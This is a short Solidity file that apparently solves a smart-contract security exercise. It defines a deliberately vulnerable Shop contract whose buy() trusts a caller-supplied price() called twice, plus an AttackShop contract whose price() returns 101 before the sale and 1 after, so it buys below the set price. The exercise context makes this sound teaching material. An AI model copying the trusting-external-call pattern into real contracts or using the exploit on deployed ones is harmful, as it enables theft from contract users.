pragma solidity ^0.6.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract AttackShop is Buyer {
    function attack(address victim) external {
        Shop(victim).buy();
    }

    // Since the buy() method in Shop is calling price() twice, we can
    // implement a conditional if statement to return a value higher
    // than 100 on the first time and a value lower than 100 on the
    // second call.
    function price() external view override returns (uint256) {
        return Shop(msg.sender).isSold() ? 1 : 101;
    }
}
